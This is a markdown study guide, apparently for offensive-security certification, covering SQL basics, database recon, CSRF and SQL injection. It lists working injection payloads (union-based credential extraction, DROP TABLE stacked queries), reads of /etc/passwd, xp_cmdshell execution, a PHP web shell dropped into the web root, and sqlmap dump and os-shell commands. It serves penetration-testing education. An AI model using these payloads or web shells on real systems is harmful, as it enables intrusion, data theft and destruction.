
# 🧠 SQL Injection and Web Exploitation Master Guide — OffSec-Ready Edition

---

## 📘 Introduction to SQL

SQL (Structured Query Language) is the language used to communicate with relational databases. It allows you to query, insert, update, and delete data in databases such as MySQL, PostgreSQL, MSSQL, and Oracle.

---

## 🔍 SQL Overview

- **Data Manipulation Language (DML)**: `SELECT`, `INSERT`, `UPDATE`, `DELETE`
- **Data Definition Language (DDL)**: `CREATE`, `ALTER`, `DROP`
- **Data Control Language (DCL)**: `GRANT`, `REVOKE`
- **Transactional Control**: `BEGIN`, `COMMIT`, `ROLLBACK`

---

## 🧾 Basic SQL Syntax

```sql
SELECT column1, column2 FROM table_name WHERE condition;
INSERT INTO table_name (col1, col2) VALUES ('val1', 'val2');
UPDATE table_name SET col1='value' WHERE col2='condition';
DELETE FROM table_name WHERE condition;
```

---

## 🔍 Manual Database Enumeration

### Common MySQL Recon
```sql
SELECT VERSION();
SELECT CURRENT_USER();
SELECT DATABASE();
SHOW TABLES;
SHOW COLUMNS FROM users;
```

### SQL Server Recon
```sql
SELECT @@VERSION;
SELECT SYSTEM_USER;
SELECT name FROM sys.databases;
SELECT name FROM sysobjects WHERE type='U';
```

### PostgreSQL Recon
```sql
SELECT version();
SELECT current_user;
SELECT datname FROM pg_database;
SELECT * FROM pg_tables;
```

### Oracle Recon
```sql
SELECT * FROM v$version;
SELECT user FROM dual;
SELECT owner FROM all_tables GROUP BY owner;
```

---

## 🌐 Cross-Origin Attacks

Cross-origin attacks abuse trust between different origins (domain, protocol, port). These include CSRF, XSS, and more.

---

## 🔐 Same-Origin Policy (SOP)

SOP restricts how documents or scripts loaded from one origin can interact with resources from another. Prevents malicious scripts from reading sensitive data.

---

## 🍪 SameSite Cookies

SameSite is a cookie attribute that controls whether a cookie is sent with cross-site requests. Options:
- `Strict`: Only sent in same-site context
- `Lax`: Sent on top-level navigation
- `None`: Sent always (requires `Secure`)

---

## 🎯 Cross-Site Request Forgery (CSRF)

Forces a logged-in user to execute unwanted actions.

### 🔍 Detecting and Preventing CSRF

- **Detecting**: Absence of CSRF token, reliance on cookies
- **Preventing**: Use CSRF tokens, double-submit cookies, same-site cookies

### 💥 Exploiting CSRF
```html
<img src="http://target.com/delete_account?id=1" />
```

---

## 🧪 Testing for SQL Injection

Try payloads in input fields, headers, and parameters.

### Basic Test Payloads
```sql
' OR 1=1 --
' AND 1=2 --
' UNION SELECT NULL, NULL --
```

---

## 📌 Closing Out Strings and Functions

Used to break out of SQL context:
- `'` for string closure
- `)--` to comment out
- `;` to stack queries

---

## 📊 Sorting

Used to determine column count or inject order clause:
```sql
ORDER BY 1 --
ORDER BY 5 --
```

---

## 🚧 Boundary Testing

Testing numeric, string, and buffer boundaries:
```sql
?id=0 -- Check for NULL bypass
?name='aaaaa...aaaa' -- Long input string
```

---

## 🧨 Fuzzing

Send randomized or malformed inputs:
- Use tools: Burp Intruder, ffuf, sqlmap
- Look for error messages, time delays

---

## 💥 Exploiting SQL Injection

Types:
- **Boolean-based**: `' AND 1=1 --`
- **Time-based**: `' AND SLEEP(5) --`
- **Error-based**: `extractvalue('',concat('>',version()))`
- **Union-based**: `' UNION SELECT NULL, username, password FROM users --`
- **Stacked**: `'; DROP TABLE users; --` (if allowed)

---

## 🔀 UNION-based Payloads

Used to append another SELECT and leak data:
```sql
' UNION SELECT 1, username, password FROM users --
```

Use `ORDER BY` to find number of columns.

---

## 🧱 Stacked Queries

Execute multiple queries in one request (supported in PostgreSQL, MSSQL):
```sql
'; SELECT user(); DROP TABLE users; --
```

---

## 📥 Reading and Writing Files

### MySQL
```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT * INTO OUTFILE '/tmp/data.txt' FROM users;
```

### PostgreSQL
```sql
SELECT pg_read_file('postgresql.conf', 0, 1000);
```

---

## 💻 Remote Code Execution

### SQL Server
```sql
EXEC xp_cmdshell('whoami');
```

### MySQL (via file drop)
```php
echo "<?php system($_GET['cmd']); ?>" > shell.php
```

Upload using SQLMap:
```bash
sqlmap -u URL --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

---

## 📦 Database Dumping with Automated Tools

### sqlmap Core Commands
```bash
sqlmap -u "http://target/page.php?id=1" --dbs --batch
sqlmap -u "http://target/page.php?id=1" -D dbname --tables
sqlmap -u "http://target/page.php?id=1" -D dbname -T users --dump
sqlmap --os-shell  # For RCE if found
```

### POST Example
```bash
sqlmap -u "http://target.com/login" --data="user=admin&pass=1" --dbs
```

---

🏁 **Final Tips**
- Use UNION when possible — faster output.
- Blind/time-based if no errors shown.
- Automate using sqlmap, but understand manual steps.
- Keep payload list handy.
